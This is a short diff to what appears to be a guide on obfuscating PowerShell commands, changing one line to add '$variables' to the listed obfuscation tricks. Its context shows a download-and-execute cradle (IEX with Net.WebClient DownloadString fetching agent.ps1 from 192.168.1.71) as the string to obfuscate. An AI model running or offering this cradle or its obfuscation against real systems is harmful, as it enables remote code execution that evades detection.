@@ -58,7 +58,7 @@ The above string can be obfuscated using the **powershell escape caracter** `<br
 
 - string command to obfuscate<br />
 `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell escape caracters** ` and + <br />
+The above string can be obfuscated using **powershell escape caracters** ` and + and $variables<br />
 
 - string obfuscated<br />
 
